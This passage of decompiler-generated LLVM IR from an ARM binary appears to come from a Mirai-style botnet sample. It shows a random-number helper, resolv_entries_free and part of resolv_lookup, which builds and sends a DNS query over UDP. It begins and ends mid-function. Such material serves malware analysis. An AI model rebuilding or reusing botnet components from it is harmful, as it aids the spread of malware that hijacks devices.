  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_f688 = load i32, i32* %r1.global-to-local, align 4
  %v3_f68c = load i32, i32* @r4, align 4
  store i32 %v3_f68c, i32* %stack_var_-28, align 4
  %v0_f690 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f690, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_f688, 1
  br i1 %tmp16, label %dec_label_pc_f738, label %dec_label_pc_f698

dec_label_pc_f698:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_24350.162 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2434c.166 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24348.164 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24344.160 to i32), i32* %r6.global-to-local, align 4
  %v2_f6a8 = load i32, i32* @global_var_24350.162, align 4
  store i32 %v2_f6a8, i32* %lr.global-to-local, align 4
  %v2_f6ac = load i32, i32* @global_var_2434c.166, align 4
  store i32 %v2_f6ac, i32* %r4.global-to-local, align 4
  %v2_f6b0 = load i32, i32* @global_var_24348.164, align 4
  store i32 %v2_f6b0, i32* %r0.global-to-local, align 4
  %v2_f6b4 = load i32, i32* @global_var_24344.160, align 4
  br label %dec_label_pc_f6d8

dec_label_pc_f6bc:                                ; preds = %dec_label_pc_f6f8
  %v1_f6bc = trunc i32 %v5_f6e8 to i16
  %v3_f6bc = inttoptr i32 %v9_f6ec to i16*
  store i16 %v1_f6bc, i16* %v3_f6bc, align 2
  %v4_f6bc = load i32, i32* %r5.global-to-local, align 4
  %v5_f6bc = add i32 %v4_f6bc, -2
  store i32 %v5_f6bc, i32* %r5.global-to-local, align 4
  %v0_f6c0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f6c0

dec_label_pc_f6c0:                                ; preds = %.thread, %dec_label_pc_f6bc
  %v0_f6c0 = phi i32 [ %v9_f6f0, %.thread ], [ %v0_f6c0.pre, %dec_label_pc_f6bc ]
  %v2_f6bc5 = phi i32 [ %v12_f6ec, %.thread ], [ %v5_f6bc, %dec_label_pc_f6bc ]
  %tmp17 = icmp slt i32 %v0_f6c0, 1
  br i1 %tmp17, label %dec_label_pc_f740, label %dec_label_pc_f6cc

dec_label_pc_f6cc:                                ; preds = %dec_label_pc_f6c0
  %v0_f6c4 = load i32, i32* %r0.global-to-local, align 4
  %v0_f6cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f6cc, i32* %r0.global-to-local, align 4
  %v0_f6d0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_f6d0, i32* %r4.global-to-local, align 4
  %v0_f6d4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f6d4, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f6d8

dec_label_pc_f6d8:                                ; preds = %dec_label_pc_f698, %dec_label_pc_f6cc
  %v0_f724 = phi i32 [ %v2_f6b0, %dec_label_pc_f698 ], [ %v0_f6cc, %dec_label_pc_f6cc ]
  %v9_f6ec = phi i32 [ %v0_f690, %dec_label_pc_f698 ], [ %v2_f6bc5, %dec_label_pc_f6cc ]
  %v0_f704 = phi i32 [ %v0_f688, %dec_label_pc_f698 ], [ %v0_f6c0, %dec_label_pc_f6cc ]
  %v0_f718 = phi i32 [ %v2_f6a8, %dec_label_pc_f698 ], [ %v0_f6d4, %dec_label_pc_f6cc ]
  %v0_f714 = phi i32 [ %v2_f6b4, %dec_label_pc_f698 ], [ %v0_f6c4, %dec_label_pc_f6cc ]
  %v4_f6d8 = mul i32 %v0_f714, 2048
  %v5_f6d8 = xor i32 %v4_f6d8, %v0_f714
  %v4_f6dc = udiv i32 %v0_f718, 524288
  %v5_f6dc = xor i32 %v4_f6dc, %v0_f718
  %v2_f6e0 = xor i32 %v5_f6dc, %v5_f6d8
  %v4_f6e8 = udiv i32 %v5_f6d8, 256
  %v5_f6e8 = xor i32 %v2_f6e0, %v4_f6e8
  store i32 %v5_f6e8, i32* %r3.global-to-local, align 4
  %v7_f6ec = icmp sgt i32 %v0_f704, 3
  br i1 %v7_f6ec, label %.thread, label %dec_label_pc_f6f8

.thread:                                          ; preds = %dec_label_pc_f6d8
  %v10_f6ec = inttoptr i32 %v9_f6ec to i32*
  store i32 %v5_f6e8, i32* %v10_f6ec, align 4
  %v11_f6ec = load i32, i32* %r5.global-to-local, align 4
  %v12_f6ec = add i32 %v11_f6ec, 4
  store i32 %v12_f6ec, i32* %r5.global-to-local, align 4
  %v8_f6f0 = load i32, i32* %r1.global-to-local, align 4
  %v9_f6f0 = add i32 %v8_f6f0, -4
  store i32 %v9_f6f0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f6c0

dec_label_pc_f6f8:                                ; preds = %dec_label_pc_f6d8
  %v7_f704 = icmp eq i32 %v0_f704, 1
  store i32 %v5_f6e8, i32* %r3.global-to-local, align 4
  %v1_f70c = add i32 %v0_f704, -2
  store i32 %v1_f70c, i32* %r1.global-to-local, align 4
  br i1 %v7_f704, label %dec_label_pc_f714, label %dec_label_pc_f6bc

dec_label_pc_f714:                                ; preds = %dec_label_pc_f6f8
  store i32 %v5_f6e8, i32* %r3.global-to-local, align 4
  %v1_f724 = load i32, i32* %r6.global-to-local, align 4
  %v2_f724 = inttoptr i32 %v1_f724 to i32*
  store i32 %v0_f724, i32* %v2_f724, align 4
  %v0_f728 = load i32, i32* %r4.global-to-local, align 4
  %v1_f728 = load i32, i32* %r7.global-to-local, align 4
  %v2_f728 = inttoptr i32 %v1_f728 to i32*
  store i32 %v0_f728, i32* %v2_f728, align 4
  %v0_f72c = load i32, i32* %lr.global-to-local, align 4
  %v1_f72c = load i32, i32* %r8.global-to-local, align 4
  %v2_f72c = inttoptr i32 %v1_f72c to i32*
  store i32 %v0_f72c, i32* %v2_f72c, align 4
  %v0_f730 = load i32, i32* %r3.global-to-local, align 4
  %v1_f730 = load i32, i32* %sl.global-to-local, align 4
  %v2_f730 = inttoptr i32 %v1_f730 to i32*
  store i32 %v0_f730, i32* %v2_f730, align 4
  %v0_f734 = load i32, i32* %r3.global-to-local, align 4
  %v1_f734 = trunc i32 %v0_f734 to i8
  %v2_f734 = load i32, i32* %r5.global-to-local, align 4
  %v3_f734 = inttoptr i32 %v2_f734 to i8*
  store i8 %v1_f734, i8* %v3_f734, align 1
  br label %dec_label_pc_f738

dec_label_pc_f738:                                ; preds = %entry, %dec_label_pc_f740, %dec_label_pc_f714
  %v2_f738 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_f738, i32* @r4, align 4
  %v1_f73c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_f73c

dec_label_pc_f740:                                ; preds = %dec_label_pc_f6c0
  %v0_f740 = load i32, i32* %r3.global-to-local, align 4
  %v1_f740 = load i32, i32* %sl.global-to-local, align 4
  %v2_f740 = inttoptr i32 %v1_f740 to i32*
  store i32 %v0_f740, i32* %v2_f740, align 4
  %v0_f744 = load i32, i32* %lr.global-to-local, align 4
  %v1_f744 = load i32, i32* %r8.global-to-local, align 4
  %v2_f744 = inttoptr i32 %v1_f744 to i32*
  store i32 %v0_f744, i32* %v2_f744, align 4
  %v0_f748 = load i32, i32* %r4.global-to-local, align 4
  %v1_f748 = load i32, i32* %r7.global-to-local, align 4
  %v2_f748 = inttoptr i32 %v1_f748 to i32*
  store i32 %v0_f748, i32* %v2_f748, align 4
  %v0_f74c = load i32, i32* %r0.global-to-local, align 4
  %v1_f74c = load i32, i32* %r6.global-to-local, align 4
  %v2_f74c = inttoptr i32 %v1_f74c to i32*
  store i32 %v0_f74c, i32* %v2_f74c, align 4
  br label %dec_label_pc_f738

; uselistorder directives
  uselistorder i32 %v9_f6f0, { 1, 0 }
  uselistorder i32 %v12_f6ec, { 1, 0 }
  uselistorder i32 %v5_f6e8, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_f714, { 1, 0 }
  uselistorder i32 %v0_f718, { 1, 0 }
  uselistorder i32 %v0_f704, { 1, 0, 2 }
  uselistorder i32 %v0_f6c0, { 1, 0 }
  uselistorder i32 %v0_f688, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_24344.160, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_24348.164, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_2434c.166, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_24350.162, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_f738, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f6d8, { 1, 0 }
}

define i32 @resolv_entries_free(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f764 = load i32, i32* @r4, align 4
  store i32 %v3_f764, i32* %stack_var_-8, align 4
  %v6_f764 = load i32, i32* @lr, align 4
  %v0_f768 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f768, i32* @r4, align 4
  %v2_f768 = icmp eq i32 %v0_f768, 0
  br i1 %v2_f768, label %dec_label_pc_f784, label %dec_label_pc_f770

dec_label_pc_f770:                                ; preds = %entry
  %v1_f770 = add i32 %v0_f768, 4
  %v2_f770 = inttoptr i32 %v1_f770 to i32*
  %v3_f770 = load i32, i32* %v2_f770, align 4
  store i32 %v3_f770, i32* %r0.global-to-local, align 4
  store i32 63356, i32* @lr, align 4
  %v1_f778 = icmp ne i32 %v3_f770, 0
  call void @__pseudo_cond_branch(i1 %v1_f778, i32 ptrtoint (i32* @global_var_14eb8.68 to i32))
  %v0_f77c = load i32, i32* @r4, align 4
  store i32 %v0_f77c, i32* @r0, align 4
  %v0_f780 = call i32 @free()
  store i32 %v0_f780, i32* %r0.global-to-local, align 4
  %v2_f784.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f784

dec_label_pc_f784:                                ; preds = %entry, %dec_label_pc_f770
  %v1_f788 = phi i32 [ 0, %entry ], [ %v0_f780, %dec_label_pc_f770 ]
  %v2_f784 = phi i32 [ %v3_f764, %entry ], [ %v2_f784.pre, %dec_label_pc_f770 ]
  store i32 %v2_f784, i32* @r4, align 4
  store i32 %v6_f764, i32* @lr, align 4
  ret i32 %v1_f788

; uselistorder directives
  uselistorder i32 %v0_f768, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_f784, { 1, 0 }
}

define i32 @resolv_lookup(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp79 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-4292 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2230 = alloca i32, align 4
  %stack_var_-2244 = alloca i16, align 2
  %stack_var_-2232 = alloca i32, align 4
  %v3_f78c = load i32, i32* @r4, align 4
  %v9_f78c = load i32, i32* @r6, align 4
  %v12_f78c = load i32, i32* @r7, align 4
  %v15_f78c = load i32, i32* @r8, align 4
  %v18_f78c = load i32, i32* @sb, align 4
  %v21_f78c = load i32, i32* @sl, align 4
  %v24_f78c = load i32, i32* @fp, align 4
  %v27_f78c = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_f7a4 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_f7a4, i32* @fp, align 4
  %v0_f7ac = load i32, i32* @r5, align 4
  store i32 %v0_f7ac, i32* %r0.global-to-local, align 4
  %v1_f7b0 = inttoptr i32 %v0_f7ac to i8*
  %v2_f7b0 = call i32 @util_strlen(i8* %v1_f7b0)
  %v2_f7b8 = ptrtoint i16* %stack_var_-2244 to i32
  store i32 %v2_f7b8, i32* @sl, align 4
  %v2_f7bc = ptrtoint i32* %stack_var_-2232 to i32
  store i32 %v2_f7bc, i32* @sb, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_f7c4 = add i32 %v2_f7b0, 1
  store i32 %v1_f7c4, i32* %r0.global-to-local, align 4
  %v2_f7c8 = ptrtoint i32* %stack_var_-2230 to i32
  store i32 %v2_f7c8, i32* %r2.global-to-local, align 4
  store i32 %v2_f7bc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_f7c4, i32* %r3.global-to-local, align 4
  %v2_f804146 = icmp eq i32 %v1_f7c4, 0
  store i1 %v2_f804146, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v1_f80c147 = add i32 %v2_f7c8, -1
  store i32 %v1_f80c147, i32* %r1.global-to-local, align 4
  %tmp116148 = icmp slt i32 %v1_f7c4, 1
  br i1 %tmp116148, label %dec_label_pc_f814, label %dec_label_pc_f7d8

dec_label_pc_f7d8:                                ; preds = %entry, %bb115
  %v0_f7d8151 = phi i32 [ %v1_f7f8, %bb115 ], [ 0, %entry ]
  %v1_f7e4150.off0 = phi i8 [ %extract.t152, %bb115 ], [ 0, %entry ]
  %v2_f818149 = phi i32 [ %v1_f7fc, %bb115 ], [ %v2_f7c8, %entry ]
  %v1_f7d8 = load i32, i32* @r5, align 4
  %v2_f7d8 = add i32 %v1_f7d8, %v0_f7d8151
  %v3_f7d8 = inttoptr i32 %v2_f7d8 to i8*
  %v4_f7d8 = load i8, i8* %v3_f7d8, align 1
  %v6_f7d8 = zext i8 %v4_f7d8 to i32
  store i32 %v6_f7d8, i32* %r3.global-to-local, align 4
  %v2_f7dc = icmp eq i8 %v4_f7d8, 0
  store i1 %v2_f7dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f7dc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_f7d8
  %v8_f7e0 = icmp eq i8 %v4_f7d8, 46
  store i1 %v8_f7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f7e0, label %.thread, label %.thread7

.thread:                                          ; preds = %dec_label_pc_f7d8, %bb
  %v3_f7e4 = load i32, i32* %r6.global-to-local, align 4
  %v4_f7e4 = inttoptr i32 %v3_f7e4 to i8*
  store i8 %v1_f7e4150.off0, i8* %v4_f7e4, align 1
  %v0_f7e8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f7e8.pr, label %.thread9.thread13, label %.thread..thread7_crit_edge

.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_f7e8.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_f7e8.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_f7e8.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb
  %v3_f7e8 = phi i32 [ %v3_f7e8.pre, %.thread..thread7_crit_edge ], [ %v2_f818149, %bb ]
  %v1_f7e8.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v4_f7d8, %bb ]
  %v4_f7e8 = add i32 %v3_f7e8, -1
  %v5_f7e8 = inttoptr i32 %v4_f7e8 to i8*
  store i8 %v1_f7e8.off0, i8* %v5_f7e8, align 1
  %v0_f7ec.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f7ec.pr, label %.thread9, label %.thread12

.thread9.thread13:                                ; preds = %.thread
  %v1_f7ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_f7ec, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread9:                                         ; preds = %.thread7
  %v1_f7ec11 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_f7ec11, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread12:                                        ; preds = %.thread7
  %v1_f7f4 = load i32, i32* @lr, align 4
  %v2_f7f4 = urem i32 %v1_f7f4, 256
  store i32 %v2_f7f4, i32* %r4.global-to-local, align 4
  br label %bb115

bb115:                                            ; preds = %.thread9, %.thread9.thread13, %.thread12
  %v0_f80833 = phi i32 [ 0, %.thread9.thread13 ], [ 0, %.thread9 ], [ %v2_f7f4, %.thread12 ]
  %v0_f7f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_f7f8 = add i32 %v0_f7f8, 1
  store i32 %v1_f7f8, i32* %ip.global-to-local, align 4
  %v0_f7fc = load i32, i32* %r2.global-to-local, align 4
  %v1_f7fc = add i32 %v0_f7fc, 1
  store i32 %v1_f7fc, i32* %r2.global-to-local, align 4
  %v1_f800.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_f800 = sub i32 %v1_f800.pre, %v1_f7f8
  store i32 %v2_f800, i32* %r3.global-to-local, align 4
  %v2_f804 = icmp eq i32 %v2_f800, 0
  store i1 %v2_f804, i1* %cpsr_z.global-to-local, align 1
  %v1_f808 = add nuw nsw i32 %v0_f80833, 1
  store i32 %v1_f808, i32* @lr, align 4
  store i32 %v0_f7fc, i32* %r1.global-to-local, align 4
  %tmp116 = icmp slt i32 %v2_f800, 1
  %extract.t152 = trunc i32 %v0_f80833 to i8
  br i1 %tmp116, label %dec_label_pc_f814, label %dec_label_pc_f7d8

dec_label_pc_f814:                                ; preds = %bb115, %entry
  %v1_f80c.lcssa = phi i32 [ %v1_f80c147, %entry ], [ %v0_f7fc, %bb115 ]
  store i32 0, i32* @r4, align 4
  %v4_f818 = inttoptr i32 %v1_f80c.lcssa to i8*
  store i8 0, i8* %v4_f818, align 1
  store i32 %v2_f7bc, i32* %r0.global-to-local, align 4
  %v1_f820 = bitcast i32* %stack_var_-2232 to i8*
  %v2_f820 = call i32 @util_strlen(i8* %v1_f820)
  %v2_f824 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_f824, i32* %r1.global-to-local, align 4
  %v1_f828 = load i32, i32* @sb, align 4
  %v2_f828 = add i32 %v1_f828, %v2_f820
  store i32 %v2_f828, i32* @r5, align 4
  %v0_f830 = load i32, i32* @r4, align 4
  store i32 %v0_f830, i32* %stack_var_-68, align 4
  store i32 %v2_f7bc, i32* %r0.global-to-local, align 4
  %v2_f840 = call i32 @util_strlen(i8* %v1_f820)
  %v1_f844 = add i32 %v2_f840, 17
  store i32 %v1_f844, i32* %r0.global-to-local, align 4
  %v0_f84c = call i32 @rand_next()
  %v1_f84c = sext i32 %v0_f84c to i64
  store i32 -2147450879, i32* %r3.global-to-local, align 4
  %v5_f858 = mul nuw nsw i64 %v1_f84c, 2147516417
  %v6_f858 = udiv i64 %v5_f858, 4294967296
  %v7_f858 = trunc i64 %v6_f858 to i32
  %v8_f858 = trunc i64 %v5_f858 to i32
  store i32 %v8_f858, i32* @lr, align 4
  store i32 %v7_f858, i32* %r2.global-to-local, align 4
  %v5_f85c4 = udiv i64 %v5_f858, 140737488355328
  %v5_f85c = trunc i64 %v5_f85c4 to i32
  %v6_f85c = add i32 %v5_f85c, %v0_f84c
  store i32 16, i32* %r1.global-to-local, align 4
  %v6_f868 = urem i32 %v6_f85c, 65536
  store i32 %v6_f868, i32* %ip.global-to-local, align 4
  %v2_f870 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_f870, i32* %r0.global-to-local, align 4
  %v5_f874 = trunc i32 %v6_f85c to i16
  %v2_f878 = call i32 @util_zero(i32 %v2_f870, i32 16)
  store i32 %v2_f878, i32* %r0.global-to-local, align 4
  store i32 13568, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v0_f8a8 = load i32, i32* @r5, align 4
  %v1_f8a8 = add i32 %v0_f8a8, 1
  store i32 %v1_f8a8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i16 %v5_f874, i16* %stack_var_-2244, align 2
  %v4_f8bc = inttoptr i32 %v1_f8a8 to i16*
  store i16 256, i16* %v4_f8bc, align 2
  %v0_f8c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_f8c0 = trunc i32 %v0_f8c0 to i16
  %v2_f8c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_f8c0 = add i32 %v2_f8c0, 2
  %v4_f8c0 = inttoptr i32 %v3_f8c0 to i16*
  store i16 %v1_f8c0, i16* %v4_f8c0, align 2
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_f958 = ptrtoint i32* %stack_var_-196 to i32
  %v2_f980 = ptrtoint i32* %stack_var_-40 to i32
  %v2_f9ac = ptrtoint i32* %stack_var_-52 to i32
  %v2_f9f0 = ptrtoint i16* %stack_var_-4292 to i32
  %v2_fa84 = ptrtoint i32* %stack_var_-4280 to i32
  %v1_fa8c = bitcast i32* %stack_var_-4280 to i8*
  %v4_fab0 = zext i16 %tmp79 to i32
  %v2_fab4 = icmp eq i16 %tmp79, 0
  br label %dec_label_pc_f8cc

dec_label_pc_f8cc:                                ; preds = %dec_label_pc_fa38, %dec_label_pc_f814
  %v1_f8d0 = phi i32 [ -1, %dec_label_pc_f814 ], [ %v0_f8cc.pre, %dec_label_pc_fa38 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_f814 ], [ %v1_fa38, %dec_label_pc_fa38 ]
  store i32 %storemerge, i32* @r8, align 4
  %v7_f8cc = icmp eq i32 %v1_f8d0, -1
  store i1 %v7_f8cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8cc, label %bb118, label %bb117

bb117:                                            ; preds = %dec_label_pc_f8cc
  store i32 %v1_f8d0, i32* %r0.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %dec_label_pc_f8cc, %bb117
  store i32 63704, i32* @lr, align 4
  %v1_f8d4 = xor i1 %v7_f8cc, true
  call void @__pseudo_cond_branch(i1 %v1_f8d4, i32 ptrtoint (i32* @global_var_16390.35 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f8e4 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_f8e4, i32* %r0.global-to-local, align 4
  %v7_f8e8 = icmp eq i32 %v3_f8e4, -1
  store i1 %v7_f8e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f8e4, i32* @r6, align 4
  br i1 %v7_f8e8, label %dec_label_pc_fa78, label %dec_label_pc_f8f4

dec_label_pc_f8f4:                                ; preds = %bb118
  store i32 %v2_f870, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_f900 = call i32 @__libc_connect(i32 %v3_f8e4, i32 %v2_f870, i32 16)
  store i32 %v3_f900, i32* %r0.global-to-local, align 4
  %v7_f904 = icmp eq i32 %v3_f900, -1
  store i1 %v7_f904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f904, label %dec_label_pc_fa40, label %dec_label_pc_f90c

dec_label_pc_f90c:                                ; preds = %dec_label_pc_f8f4
  %v0_f90c = load i32, i32* @r6, align 4
  store i32 %v0_f90c, i32* %r0.global-to-local, align 4
  store i32 %v2_f7b8, i32* %r1.global-to-local, align 4
  store i32 %v1_f844, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f91c = call i32 @__libc_send(i32 %v0_f90c, i32 %v2_f7b8, i32 %v1_f844, i32 16384)
  store i32 %v4_f91c, i32* %r0.global-to-local, align 4
  %v7_f920 = icmp eq i32 %v4_f91c, -1
  store i1 %v7_f920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f920, label %dec_label_pc_fa40, label %dec_label_pc_f928

dec_label_pc_f928:                                ; preds = %dec_label_pc_f90c
  %v0_f928 = load i32, i32* @r6, align 4
  store i32 %v0_f928, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_f934 = call i32 @__libc_fcntl(i32 3, i32 %v0_f928)
  %v0_f938 = load i32, i32* @r6, align 4
  store i32 %v0_f938, i32* %r1.global-to-local, align 4
  %v1_f93c = or i32 %v2_f934, 2048
  store i32 %v1_f93c, i32* @r2, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_f944 = call i32 @__libc_fcntl(i32 4, i32 %v0_f938)
  store i32 %v2_f944, i32* %r0.global-to-local, align 4
  store i32 %v2_f824, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %v2_f958, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f960

dec_label_pc_f960:                                ; preds = %dec_label_pc_f960, %dec_label_pc_f928
  %v1_f964 = phi i32 [ %v1_f968, %dec_label_pc_f960 ], [ 4, %dec_label_pc_f928 ]
  store i32 0, i32* @r4, align 4
  %v3_f964 = add i32 %v1_f964, %v2_f958
  %v4_f964 = inttoptr i32 %v3_f964 to i32*
  store i32 0, i32* %v4_f964, align 4
  %v0_f968 = load i32, i32* %r3.global-to-local, align 4
  %v1_f968 = add i32 %v0_f968, 4
  store i32 %v1_f968, i32* %r3.global-to-local, align 4
  %v7_f96c = icmp eq i32 %v1_f968, 128
  br i1 %v7_f96c, label %dec_label_pc_f974, label %dec_label_pc_f960

dec_label_pc_f974:                                ; preds = %dec_label_pc_f960
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f974 = load i32, i32* @r6, align 4
  %v3_f974 = udiv i32 %v0_f974, 32
  %v3_f97c = mul nuw nsw i32 %v3_f974, 4
  store i32 %v3_f97c, i32* %r3.global-to-local, align 4
  %v2_f984 = add i32 %v3_f97c, %v2_f980
  store i32 %v2_f984, i32* @r5, align 4
  %v1_f988 = add i32 %v2_f984, -156
  %v2_f988 = inttoptr i32 %v1_f988 to i32*
  %v3_f988 = load i32, i32* %v2_f988, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_f990 = urem i32 %v0_f974, 32
  store i32 %v1_f990, i32* @r7, align 4
  %v7_f994 = shl i32 1, %v1_f990
  %v8_f994 = or i32 %v3_f988, %v7_f994
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_f994, i32* %v2_f988, align 4
  %v0_f9a4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f9a4, i32* %stack_var_-52, align 4
  store i32 %v2_f9ac, i32* @lr, align 4
  store i32 %v2_f824, i32* %ip.global-to-local, align 4
  %v0_f9b4 = load i32, i32* @r6, align 4
  %v1_f9b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_f9b4 = add i32 %v1_f9b4, %v0_f9b4
  store i32 %v2_f9b4, i32* %r0.global-to-local, align 4
  %v0_f9bc = load i32, i32* @r4, align 4
  store i32 %v0_f9bc, i32* %r2.global-to-local, align 4
  store i32 %v0_f9bc, i32* %r3.global-to-local, align 4
  %v5_f9c8 = call i32 @__libc_select(i32 %v2_f9b4, i32 %v2_f958, i32 %v0_f9bc, i32 %v0_f9bc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_f9c8, i32* %r0.global-to-local, align 4
  %v7_f9cc = icmp eq i32 %v5_f9c8, -1
  store i1 %v7_f9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9cc, label %dec_label_pc_fa50, label %dec_label_pc_f9d4

dec_label_pc_f9d4:                                ; preds = %dec_label_pc_f974
  %v1_f9d4 = load i32, i32* @r4, align 4
  %v9_f9d4 = icmp eq i32 %v5_f9c8, %v1_f9d4
  store i1 %v9_f9d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f9d4, label %dec_label_pc_fa30, label %dec_label_pc_f9dc

dec_label_pc_f9dc:                                ; preds = %dec_label_pc_f9d4
  %v0_f9dc = load i32, i32* @r5, align 4
  %v1_f9dc = add i32 %v0_f9dc, -156
  %v2_f9dc = inttoptr i32 %v1_f9dc to i32*
  %v3_f9dc = load i32, i32* %v2_f9dc, align 4
  %v1_f9e0 = load i32, i32* @r7, align 4
  %v6_f9e0 = ashr i32 %v3_f9dc, %v1_f9e0
  store i32 %v6_f9e0, i32* %r3.global-to-local, align 4
  %v1_f9e4 = urem i32 %v6_f9e0, 2
